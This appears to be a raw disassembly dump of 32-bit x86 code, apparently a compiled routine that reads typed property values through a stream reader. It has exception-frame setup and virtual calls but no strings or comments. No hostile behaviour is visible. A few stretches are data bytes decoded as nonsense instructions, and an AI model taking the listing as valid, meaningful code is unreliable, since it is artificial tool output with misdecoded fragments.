mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
or [ eax + 0x1c ] 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
or [ eax + 0x1c ] 0x200
sub_41c553
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
call sub_41c408
pop ecx
test al al
jne r-xdata
call sub_4039a4
pop edi
pop esi
pop ebx
pop ebp
retn
call sub_403950
sub_41c578
push ebp
mov ebp esp
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_41c5f0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax + 0x2c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov si 0xfff8
call sub_403370
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x1c ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x14 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
test [ eax + 0x1c ] 0x10
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x1c ]
call sub_417c68
mov edx [ ebp + 0x8 ]
cmp eax [ edx - 0x14 ]
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
or [ eax + 0x1c ] 0x200
sub_41c5f5
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
call sub_41c408
pop ecx
test al al
jne r-xdata
call sub_4039a4
pop edi
pop esi
pop ebx
pop ebp
retn
call sub_403950
sub_41c618
push ebp
mov ebp esp
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_41c693
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_41dfd8
mov ecx eax
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x1c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x14 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov si 0xfff2
call sub_403370
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov [ eax + 0x2c ] ebx
mov eax [ ebp + 0x8 ]
test ebx ebx
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov [ edx + 0x2c ] eax
pop edi
pop esi
pop ebx
pop ebp
retn
sub_41c698
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
call sub_41c408
pop ecx
test al al
jne r-xdata
call sub_4039a4
pop edi
pop esi
pop ebx
pop ebp
retn
call sub_403950
sub_41c6bc
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_41c8dd
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x20 ]
lea edx [ ebp - 0x9 ]
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x8 ]
call sub_41d968
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x8 ]
call sub_41d968
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x2c ]
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x1c ]
mov [ ebp - 0x28 ] eax
xor eax eax
push ebp
push sub_41c8ad
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
cmp [ ebp - 0x14 ] 0x0
je r-xdata
test [ ebp - 0x9 ] 0x1
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x24 ]
mov [ eax + 0x2c ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x28 ]
mov [ eax + 0x1c ] edx
retn
xor eax eax
push ebp
push sub_41c86b
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
mov eax [ ebp - 0x14 ]
call sub_41c308
pop ecx
mov eax [ ebp - 0x14 ]
or [ eax + 0x1c ] 0x1
push ebp
mov dl 0x1
mov ax [ r-xdata ]
call sub_41c380
pop ecx
test [ ebp - 0x9 ] 0x1
jne r-xdata
push ebp
call sub_41c468
pop ecx
push ebp
call sub_41c618
pop ecx
jmp r-xdata
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
push ebp
call sub_41c578
pop ecx
mov eax [ ebp - 0x14 ]
test [ eax + 0x1d ] 0x2
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
call sub_4039d4
jmp r-xdata
mov eax [ ebp - 0x14 ]
or [ eax + 0x1c ] 0x2
push ebp
mov dl 0x1
mov ax [ r-xdata ]
call sub_41c380
pop ecx
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x14 ]
mov eax [ ebp - 0x14 ]
and [ eax + 0x1c ] 0xfffd
push ebp
xor edx edx
mov ax [ r-xdata ]
call sub_41c380
pop ecx
test [ ebp - 0x9 ] 0x2
je r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x14 ]
mov [ eax + 0x1c ] edx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41c8e4
lea eax [ ebp - 0x1c ]
mov edx 0x2
call sub_403f10
lea eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_4050ac
retn
test [ ebp - 0x9 ] 0x1
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x2c ]
mov ecx [ ebp - 0x20 ]
mov edx [ ebp - 0x14 ]
mov si 0xfff9
call sub_403370
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x14 ]
call sub_418304
test eax eax
jge r-xdata
mov eax [ ebp - 0x14 ]
test [ eax + 0x1d ] 0x2
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
push ebp
mov eax [ ebp - 0x14 ]
call sub_41c2cc
pop ecx
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x14 ]
call sub_41814c
jmp r-xdata
push ebp
mov eax [ ebp - 0x14 ]
call sub_41c2cc
pop ecx
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x14 ]
call sub_41814c
sub_41c870
push ebp
call sub_41c3e8
pop ecx
test al al
je r-xdata
call sub_403950
call sub_4039a4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x24 ]
mov [ eax + 0x2c ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x28 ]
mov [ eax + 0x1c ] edx
retn
mov eax [ ebp - 0x14 ]
call sub_403174
sub_41c8f8
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41c968
pop ebx
pop ecx
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403144
mov edx [ ebp - 0x4 ]
mov [ edx + 0x30 ] eax
xor eax eax
push ebp
push sub_41c953
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41c968
mov eax [ ebp - 0x4 ]
call sub_41beb8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_41bffc
retn
sub_41c968
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41bda0
test al al
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41ce70
mov eax [ ebp - 0x4 ]
call sub_41cd0c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2c ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov [ ebp - 0xc ] eax
mov eax ebx
mov si 0xfffb
call sub_403370
mov edx [ ebp - 0x4 ]
mov [ edx + 0x2c ] eax
xor eax eax
push ebp
push sub_41ca2a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov si 0xfffc
call sub_403370
mov edi eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x28 ] edi
test edi edi
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_41bda0
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x28 ] eax
jmp r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_41c6bc
mov eax [ ebp - 0x4 ]
call sub_41cd0c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ca31
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x2c ] edx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x28 ] edx
retn
sub_41ca38
push ebx
add esp 0xffffffec
mov ebx eax
mov eax ebx
call sub_41db44
cmp al 0x5
jne r-xdata
dec [ ebx + 0x10 ]
mov eax ebx
call sub_41ccc0
mov [ esp + 0xc ] eax
mov [ esp + 0x10 ] edx
fild [ esp + 0xc ]
fstp [ esp ]
fwait
mov edx esp
mov ecx 0xa
mov eax ebx
call sub_41c108
jmp r-xdata
fld [ esp ]
add esp 0x14
pop ebx
retn
sub_41ca7c
push ebx
add esp 0xfffffff4
mov ebx eax
mov eax ebx
call sub_41db44
cmp al 0xf
jne r-xdata
dec [ ebx + 0x10 ]
mov eax ebx
call sub_41ccc0
mov [ esp + 0x4 ] eax
mov [ esp + 0x8 ] edx
fild [ esp + 0x4 ]
fstp [ esp ]
fwait
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_41c108
jmp r-xdata
fld [ esp ]
add esp 0xc
pop ebx
retn
sub_41cac0
push ebx
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_41db44
cmp al 0x10
jne r-xdata
dec [ ebx + 0x10 ]
mov eax ebx
call sub_41ccc0
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
mov edx esp
mov ecx 0x8
mov eax ebx
call sub_41c108
jmp r-xdata
fild [ esp ]
add esp 0x10
pop ebx
retn
sub_41cb10
push ebx
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_41db44
cmp al 0x11
jne r-xdata
dec [ ebx + 0x10 ]
mov eax ebx
call sub_41ccc0
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
mov edx esp
mov ecx 0x8
mov eax ebx
call sub_41c108
jmp r-xdata
fld [ esp ]
add esp 0x10
pop ebx
retn
sub_41cb54
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_41db44
and eax 0x7f
cmp eax 0xd
ja r-xdata
call sub_41bbe0
mov al [ eax + lookup_table_41cb7b ]
jmp [ eax * 4 + jump_table_41cb89 ]
mov edx esp
mov ecx 0x1
mov eax ebx
call sub_41c108
xor ecx ecx
mov cl [ esp ]
mov eax esi
xor edx edx
call sub_403fdc
mov eax esi
call j_sub_4043b8
mov edx eax
xor ecx ecx
mov cl [ esp ]
mov eax ebx
call sub_41c108
jmp r-xdata
mov eax esi
mov edx r-xdata
call sub_403f40
jmp r-xdata
mov eax esi
mov edx r-xdata
call sub_403f40
jmp r-xdata
mov eax esi
mov edx r-xdata
call sub_403f40
jmp r-xdata
mov eax esi
mov edx r-xdata
call sub_403f40
jmp r-xdata
pop edx
pop esi
pop ebx
retn
sub_41cc54
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_41db44
sub al 0x2
je r-xdata
lea edx [ esp + 0x4 ]
mov ecx 0x1
mov eax ebx
call sub_41c108
movsx eax [ esp + 0x4 ]
mov [ esp ] eax
jmp r-xdata
dec al
je r-xdata
mov eax [ esp ]
pop ecx
pop edx
pop ebx
retn
lea edx [ esp + 0x6 ]
mov ecx 0x2
mov eax ebx
call sub_41c108
movsx eax [ esp + 0x6 ]
mov [ esp ] eax
jmp r-xdata
dec al
je r-xdata
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_41c108
jmp r-xdata
jmp r-xdata
call sub_41bbe0
sub_41ccc0
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_41c0e4
cmp al 0x13
jne r-xdata
mov eax ebx
call sub_41cc54
cdq
mov [ esp ] eax
mov [ esp + 0x4 ] edx
mov eax ebx
call sub_41db44
mov edx esp
mov ecx 0x8
mov eax ebx
call sub_41c108
jmp r-xdata
mov eax [ esp ]
mov edx [ esp + 0x4 ]
pop ecx
pop edx
pop ebx
retn
sub_41cd14
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov al [ r-xdata ]
mov [ esi ] al
mov eax ebx
call sub_41c0e4
and al 0xf0
cmp al 0xf0
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_41db44
and al 0xf
mov [ esi ] al
test [ esi ] 0x2
je r-xdata
mov eax ebx
call sub_41cc54
mov [ edi ] eax
sub_41cd51
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
add esp 0xfffffedc
push ebx
xor edx edx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_41ce45
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_403eec
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ r-xdata ]
call sub_403300
test al al
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov edx [ edx + 0x8 ]
call sub_403f84
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x124 ] eax
mov [ ebp - 0x120 ] 0xb
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x11c ] eax
mov [ ebp - 0x118 ] 0xb
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov [ ebp - 0x114 ] eax
mov [ ebp - 0x110 ] 0xb
mov eax [ ebx + 0x4 ]
mov [ ebp - 0x10c ] eax
mov [ ebp - 0x108 ] 0xb
lea eax [ ebp - 0x124 ]
push eax
push 0x3
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b804
call sub_403928
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ce4c
lea edx [ ebp - 0x104 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
call sub_4030c4
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_404150
sub_41ce70
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_41d040
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
push ebp
push j_sub_403768
push [ fs : edx ]
mov [ fs : edx ] esp
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
call sub_41d968
xor edx edx
push ebp
push j_sub_403768#2
push [ fs : edx ]
mov [ fs : edx ] esp
mov ebx 0x1
mov eax [ ebp - 0x8 ]
call sub_4041ac
mov esi eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0xc ]
mov [ eax + 0x78 ] 0x1
cmp esi ebx
jl r-xdata
mov eax [ ebp - 0xc ]
add eax 0x70
push eax
mov ecx ebx
sub ecx edi
mov edx edi
mov eax [ ebp - 0x8 ]
call sub_40440c
cmp esi ebx
jl r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + ebx - 0x1 ] 0x2e
jne r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax ]
call sub_40339c
mov edx [ ebp - 0xc ]
mov edx [ edx + 0x70 ]
call sub_4147ac
mov edi eax
test edi edi
je r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax ]
call sub_40339c
mov edx [ ebp - 0xc ]
mov edx [ edx + 0x70 ]
call sub_4147ac
mov edi eax
test edi edi
jne r-xdata
inc ebx
mov eax [ ebp - 0xc ]
mov [ eax + 0x78 ] 0x0
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov eax [ ebp - 0xc ]
mov [ eax + 0x78 ] 0x1
mov eax [ ebp - 0xc ]
cmp [ eax + 0x70 ] 0x0
je r-xdata
mov ecx edi
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
call sub_41d1f4
jmp r-xdata
xor eax eax
mov [ ebp - 0x14 ] eax
mov eax [ edi ]
mov eax [ eax ]
cmp [ eax ] 0x7
jne r-xdata
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x70 ]
mov eax [ ebp - 0xc ]
call sub_41c0f4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x70 ]
mov eax [ ebp - 0xc ]
call sub_41c0f4
mov eax [ ebp - 0x14 ]
mov edx [ r-xdata ]
call sub_403300
test al al
jne r-xdata
mov edx edi
mov eax [ ebp - 0x10 ]
call sub_4148a0
mov [ ebp - 0x14 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
inc ebx
jmp r-xdata
push ebp
call sub_41ce54
pop ecx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d047
lea eax [ ebp - 0x8 ]
call sub_403eec
retn
mov edi ebx
jmp r-xdata
sub_41cffa
add [ eax ] eax
add [ eax ] al
and [ eax + 0x40 ] dh
add [ esi ] al
rol [ ecx ] 0x1
mov ebx eax
mov eax [ ebp - 0xc ]
cmp [ eax + 0x78 ] 0x0
je r-xdata
call sub_403950
mov edx [ ebx + 0x4 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
test al al
jne r-xdata
call sub_4039a4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d047
lea eax [ ebp - 0x8 ]
call sub_403eec
retn
sub_41d050
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ esi ]
mov eax [ eax ]
call sub_417b10
mov ebx eax
test ebx ebx
je r-xdata
call sub_41bbe0
lea edx [ ebp - 0x8 ]
mov eax edi
call ebx
test al al
je r-xdata
mov ecx [ ebp - 0x8 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_414914
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41d098
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x18 ]
push eax
push esi
push 0x0
push edi
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_41b674
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_41814c
pop edi
pop esi
pop ebx
pop ebp
retn
sub_41d0d8
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
xor eax eax
push ebp
push sub_41d127
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41e25c
lea ecx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_415134
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d12e
lea eax [ ebp - 0x10 ]
call sub_40ece8
retn
sub_41d134
push ebp
mov ebp esp
push 0x0
push 0x0
xor eax eax
push ebp
push sub_41d1e6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41c0e4
cmp al 0xd
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
push eax
push 0x0
lea edx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41cb54
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_41b674
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_41814c
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41db44
lea eax [ ebp - 0x4 ]
call sub_405758
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ ebp - 0x4 ]
call sub_4152d0
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d1ed
lea eax [ ebp - 0x8 ]
call sub_403eec
lea eax [ ebp - 0x4 ]
call sub_405758
retn
sub_41d1f4
push ebp
mov ebp esp
push ecx
mov ecx 0x5
push 0x0
push 0x0
dec ecx
jne r-xdata
xchg [ ebp - 0x4 ] ecx
push ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41d4ef
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax ]
mov ebx [ eax ]
xor eax eax
mov al [ ebx ]
cmp eax 0x10
ja r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax ]
mov eax [ eax ]
cmp [ eax ] 0x7
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41d4f6
lea eax [ ebp - 0x2c ]
mov edx 0x2
call sub_403f10
lea eax [ ebp - 0x24 ]
call sub_4045cc
lea eax [ ebp - 0x20 ]
mov edx 0x3
call sub_403f10
retn
jmp [ eax * 4 + jump_table_41d284 ]
mov eax [ rw-data ]
call sub_41bbc8
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_4148a0
mov edx [ r-xdata ]
call sub_403300
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_41c0e4
cmp al 0x7
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_41c1a4
xor ecx ecx
mov cl al
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_414914
jmp r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_41cb54
mov edx [ ebp - 0x1c ]
mov eax ebx
call sub_414748
mov ecx eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_414914
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41ca38
add esp 0xfffffff4
fstp [ esp ]
fwait
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_414ee8
jmp r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
call sub_41d9a4
mov ecx [ ebp - 0x20 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_414be8
jmp r-xdata
lea edx [ ebp - 0x24 ]
mov eax [ ebp - 0x4 ]
call sub_41da60
mov ecx [ ebp - 0x24 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_414cfc
jmp r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41d888
mov ecx eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_414914
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41c0e4
sub al 0xd
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_41c0e4
cmp al 0xd
jne r-xdata
push ebp
call sub_41d0d8
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41ccc0
push edx
push eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_415214
jmp r-xdata
push ebp
call sub_41d134
pop ecx
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_4148a0
test [ eax + 0x24 ] 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_41cc54
mov ecx eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_414914
jmp r-xdata
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_41cb54
mov ecx [ ebp - 0x18 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_41d050
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41db44
xor ecx ecx
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_414914
jmp r-xdata
dec al
je r-xdata
lea edx [ ebp - 0x2c ]
mov eax [ ebp - 0x4 ]
call sub_41cb54
mov ecx [ ebp - 0x2c ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x18 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_41db44
mov ecx rw-data
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_4151b4
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41db44
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_4148a0
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_41c1fc
jmp r-xdata
jmp r-xdata
lea ecx [ ebp - 0x14 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_4151b4
jmp r-xdata
push ebp
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
call sub_41cb54
mov ecx [ ebp - 0x28 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_41d098
pop ecx
jmp r-xdata
sub_41d4fc
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov ebx edx
mov edi eax
xor esi esi
mov eax ebx
mov edx edi
call sub_403f40
jmp r-xdata
mov eax [ ebx ]
call sub_417ca8
test al al
je r-xdata
inc esi
push ebx
mov [ ebp - 0x10 ] edi
mov [ ebp - 0xc ] 0xb
mov [ ebp - 0x8 ] esi
mov [ ebp - 0x4 ] 0x0
lea edx [ ebp - 0x10 ]
mov ecx 0x1
mov eax r-xdata
call sub_408c7c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41d55c
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x30 ] ecx
mov [ ebp - 0x28 ] ecx
mov [ ebp - 0x24 ] ecx
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41d877
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_41d944
xor eax eax
mov [ ebp - 0xc ] eax
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor eax eax
push ebp
push sub_41d855
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_41d816
push [ fs : eax ]
mov [ fs : eax ] esp
